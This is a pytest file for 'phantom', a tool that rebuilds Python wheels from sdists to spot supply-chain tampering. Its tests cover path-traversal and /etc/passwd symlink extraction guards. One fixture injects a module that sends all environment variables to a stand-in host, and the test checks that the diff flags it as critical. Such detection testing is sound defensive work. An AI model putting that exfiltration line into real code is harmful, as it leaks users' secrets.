"""Assisted rebuild: safe extraction, orchestration guards, and (when the
``build`` package is present) an end-to-end sdist rebuild."""

from __future__ import annotations

import importlib.util
import io
import tarfile

import pytest

from phantom import cli, core, differ, rebuild
from phantom.ecosystems.base import Ecosystem, Fetcher
from phantom.errors import OutOfScopeError, PhantomError
from phantom.models import Artifact, FileEntry, Severity, SourceTree
from phantom.normalizers.python_ast import PythonASTNormalizer
from phantom.registry import Registry

_HAS_BUILD = importlib.util.find_spec("build") is not None
needs_build = pytest.mark.skipif(not _HAS_BUILD, reason="requires the build package")

PYPROJECT = """\
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"

[project]
name = "demopkg"
version = "1.0"
"""


def _make_sdist(modules: dict[str, str], root: str = "demopkg-1.0") -> bytes:
    files = {"pyproject.toml": PYPROJECT, **modules}
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for name, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(f"{root}/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def _tar_with_member(name: str, *, symlink_to: str | None = None) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        info = tarfile.TarInfo(name)
        if symlink_to is not None:
            info.type = tarfile.SYMTYPE
            info.linkname = symlink_to
            tar.addfile(info)
        else:
            info.size = 3
            tar.addfile(info, io.BytesIO(b"xxx"))
    return buffer.getvalue()


def test_safe_extract_rejects_path_traversal(tmp_path):
    with pytest.raises(ValueError, match="unsafe path"):
        rebuild._safe_extract(_tar_with_member("../escape.txt"), tmp_path)


def test_safe_extract_rejects_symlink(tmp_path):
    with pytest.raises(ValueError, match="link in sdist"):
        rebuild._safe_extract(
            _tar_with_member("link", symlink_to="/etc/passwd"), tmp_path
        )


class _RebuildFetcher(Fetcher):
    def __init__(self, sdist: bytes | None, published: list[FileEntry]):
        self._sdist = sdist
        self._published = published

    def fetch_artifact(self, pkg, version) -> Artifact:
        return Artifact(pkg, version, f"{pkg}-{version}.whl", self._published, {})

    def fetch_sdist(self, pkg, version) -> bytes | None:
        return self._sdist


class _NoSdistEcosystem(Ecosystem):
    name = "pypi"

    def __init__(self, fetcher):
        self._fetcher = fetcher

    @property
    def fetcher(self):
        return self._fetcher

    @property
    def source_resolver(self):
        raise NotImplementedError

    @property
    def normalizers(self):
        return [PythonASTNormalizer()]


class _NoRebuildFetcher(Fetcher):
    def fetch_artifact(self, pkg, version) -> Artifact:
        return Artifact(pkg, version, "x", [], {})


def test_rebuild_rejects_ecosystem_without_sdist_support():
    eco = _NoSdistEcosystem(_NoRebuildFetcher())
    with pytest.raises(PhantomError, match="not supported"):
        core.rebuild("demopkg", "1.0", eco)


def test_rebuild_requires_a_published_sdist():
    eco = _NoSdistEcosystem(_RebuildFetcher(sdist=None, published=[]))
    with pytest.raises(OutOfScopeError, match="no sdist"):
        core.rebuild("demopkg", "1.0", eco)


def test_cli_rebuild_flag_routes_to_rebuild(capsys):
    registry = Registry()
    registry.register(_NoSdistEcosystem(_RebuildFetcher(sdist=None, published=[])))
    code = cli.run(["scan", "demopkg==1.0", "--rebuild"], registry=registry)
    assert code == 3  # OutOfScope: no sdist to rebuild from
    assert "no sdist" in capsys.readouterr().err


@needs_build
def test_rebuild_wheel_from_sdist_produces_module():
    sdist = _make_sdist({"demopkg/__init__.py": "VALUE = 1\n"})
    result = rebuild.rebuild_wheel_from_sdist(sdist)
    assert result.files is not None, result.detail
    paths = {f.path for f in result.files}
    assert "demopkg/__init__.py" in paths


@needs_build
def test_rebuild_flags_wheel_injection():
    sdist = _make_sdist({"demopkg/__init__.py": "VALUE = 1\n"})
    built = rebuild.rebuild_wheel_from_sdist(sdist)
    assert built.files is not None, built.detail

    injected = FileEntry(
        "demopkg/_evil.py",
        b"import os, urllib.request\n"
        b"urllib.request.urlopen('http://x', data=str(os.environ).encode())\n",
    )
    published = Artifact("demopkg", "1.0", "demopkg-1.0.whl", built.files + [injected], {})
    rebuilt_tree = SourceTree("local rebuild from sdist", "rebuilt", built.files)
    outcome = differ.diff(published, rebuilt_tree, [PythonASTNormalizer()])

    evil = [f for f in outcome.findings if f.path == "demopkg/_evil.py"]
    assert len(evil) == 1
    assert evil[0].severity == Severity.CRITICAL
